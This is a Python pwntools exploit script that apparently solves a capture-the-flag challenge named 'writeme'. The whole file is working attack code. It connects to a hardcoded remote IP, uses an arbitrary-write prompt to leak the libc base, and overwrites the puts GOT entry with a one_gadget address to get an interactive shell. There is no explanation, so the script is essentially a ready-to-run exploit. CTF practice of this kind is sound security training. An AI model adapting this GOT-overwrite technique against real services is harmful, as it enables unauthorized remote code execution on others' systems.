#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

libc = ELF("./libc.so")

r = remote("35.194.194.168", 6666)
#r = process("writeme", env = {"LD_PRELOAD": "./libc.so"})
#gdb.attach(proc.pidof(r)[0])

puts_got = 0x600ba0
one_gadget = 0xf1117

r.sendlineafter("Where u want to write :", str(puts_got))
libc.address = int(r.recvline()[9:].strip().split(b'=')[1], 16) - libc.symbols[b"puts"]
r.sendlineafter("What value u want to write :", str(libc.address + one_gadget))

r.interactive()
